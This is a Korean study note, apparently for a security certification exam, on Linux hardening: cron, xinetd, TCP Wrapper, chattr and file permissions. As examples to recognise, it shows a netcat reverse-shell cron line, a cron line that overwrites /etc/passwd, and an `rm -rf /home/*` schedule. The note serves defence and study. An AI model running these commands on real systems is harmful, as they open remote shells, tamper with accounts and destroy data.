---
title: crontab · xinetd · 리눅스 서비스 보안
domain: 시스템보안
questions: [7-14, 8-15, 9-12, 12-5, 24-18, 30-17, 12-14]
tags: [crontab, xinetd, logrotate, TMOUT, securetty, 서비스하드닝]
---

## 한 줄 정의

리눅스 서버 하드닝은 **예약 작업(cron) 점검 → 불필요 서비스(xinetd) 차단 → 접근 통제(TCP Wrapper) → 파일 보호(chattr·권한)** 순으로 묻는다. 공격자는 cron 으로 백도어를 심고, 방어자는 같은 곳을 먼저 조사한다. {{7-14}} {{8-15}} {{9-12}}

## crontab — 예약 작업

```text
분  시  일  월  요일   명령
 0   3   *   *   0     rm -rf /home/*    # 매주 일요일 03:00
```

| 명령 | 용도 |
|---|---|
| `crontab -l` | 현재 등록 조회 |
| `crontab -e` | 편집 |
| `crontab -u user -e` | 특정 사용자 것 편집 |
| `/etc/cron.allow` · `/etc/cron.deny` | 사용 허용 / 거부 목록 |

### 침해 조사 — 비인가 작업 찾기

cron · at · systemd timer 에 등록된 낯선 작업을 점검한다.

| 의심 항목 | 의미 |
|---|---|
| `... root cp /tmp/passwd1 /etc/passwd` | 계정 파일 **변조** |
| `... root nc 10.10.10.10 80 -e /bin/bash` | **리버스 셸** (80포트로 위장해 아웃바운드 우회) |

## xinetd — 서비스별 설정 (`/etc/xinetd.d/서비스`)

| 속성 | 의미 |
|---|---|
| `disable = yes` | **서비스 비활성화** |
| `only_from = 192.168.10.0/24` | 접속 허용 대역 |
| `no_access = 10.0.0.0/8` | 접속 차단 대역 |
| `instances = 50` | 동시 서버 프로세스 수 (DoS 완화) |
| `per_source = 10` | 출발지 IP당 동시 연결 수 |
| `cps = 10 5` | 초당 10개 초과 시 5초 차단 |
| `access_times = 09:00-18:00` | 허용 시간대 |
| `log_on_failure += USERID` | 실패 시 USERID 로깅 |

### 반드시 꺼야 할 서비스

대부분 **DoS 취약 · 정보 노출 · 평문 인증** 이라 `disable = yes` 로 차단한다.

| 서비스 | 위험 |
|---|---|
| `echo` `discard` `daytime` `chargen` | 반사·증폭 DoS (특히 Chargen) |
| `rlogin` `rsh` `rexec` | r 계열 — 신뢰 파일만으로 패스워드 없이 접속 |
| `finger` `tftp` `talk` | 계정 정보 노출(finger) · 인증 없음(tftp) |
| `rpc.cmsd` `rusersd` | RPC 기반 취약 서비스 |

## TCP Wrapper — 2차 접근 통제

`/etc/hosts.allow` 와 `/etc/hosts.deny` 로 xinetd 기반 서비스를 한 번 더 거른다.

> [!함정] 검사 순서는 allow → deny
> allow 에 먼저 매칭되면 **그것으로 확정**한다. 어느 쪽에도 없으면 **기본 허용**이므로, 막으려면 deny 에 `ALL : ALL` 을 둔다.

```text
# /etc/hosts.allow
in.telnetd : .aaa.com EXCEPT www.aaa.com   # aaa.com 허용, www.aaa.com 만 예외로 차단
# /etc/hosts.deny
ALL : ALL                                   # 나머지 전부 차단
```

## 파일 속성 잠금 — chattr · lsattr {{12-14}}

일반 권한(rwx) 위에 얹는 **확장 속성**으로, 로그·설정 파일을 변조·삭제에서 지킨다.

| 명령 | 의미 |
|---|---|
| `lsattr <파일>` | 확장 속성 조회 |
| `chattr +i <파일>` | **immutable** — root 도 수정·삭제·이름변경·링크 불가 (해제 `-i`) |
| `chattr +a <파일>` | **append-only** — 추가만 가능, 덮어쓰기·삭제 불가 (**로그 파일에 적합**) |

- 방어: 공격자가 `/etc/passwd` · `.bash_history` · 로그를 못 지우게 `+a` / `+i`
- 조사: `lsattr` 로 **공격자가 백도어 보호용으로 건 immutable 파일**을 찾는다
- 로그인 이력은 `last`(`/var/log/wtmp`) — 자세한 건 로그 파일 노트 참고

## 주요 설정 파일 권한

| 파일 | 소유자 | 권한 | 이유 |
|---|---|---|---|
| `/etc/passwd` | root | 644 | 읽기는 모두 필요, 쓰기는 root 만 |
| `/etc/shadow` | root | 400 | root 만 읽기 |
| `/etc/hosts` | root | 600 | IP 매핑 보호 |
| `/etc/xinetd.conf` | root | 600 | 서비스 기동 설정 보호 |
| `/etc/syslog.conf` (`rsyslog.conf`) | root | 644 | 로그 설정 보호 |

## 취약 파일 탐지

```bash
find / -type f -perm -2 -exec ls -al {} \;      # World Writable 파일
chmod o-w [파일명]                               # 쓰기 권한 제거

find / -nouser -o -nogroup -exec ls -al {} \;    # 소유자·그룹 없는(고아) 파일 — 계정 삭제 후 잔존
```

## 기타 하드닝 체크리스트

| 항목 | 설정 |
|---|---|
| 세션 타임아웃 | `/etc/profile` 에 `export TMOUT=600` |
| 콘솔 root 로그인 제한 | `/etc/securetty` (허용 tty 만, 비우면 차단) |
| SSH root 로그인 | `sshd_config` → `PermitRootLogin no` |
| r 명령 신뢰 파일 | `/etc/hosts.equiv` · `~/.rhosts` → 소유자 root, 권한 600, `+` 제거 (SSH 로 대체) |
| 로그 순환 | `logrotate` (`weekly` `rotate N` `compress` `create`) |
| 계정 잠금 | PAM `pam_faillock` / `pam_tally2` (`deny=5 unlock_time=120`) |
| SUID / SGID | `find / -perm -4000 -o -perm -2000` 후 불필요분 `chmod -s` |

## 기출 포인트

> [!시험] 이렇게 나온다
> cron 항목 해석(리버스 셸 · 파일 변조) · xinetd 속성 의미 · hosts.allow/deny 우선순위 · chattr `+i` vs `+a` · World Writable 탐지 `find` 명령
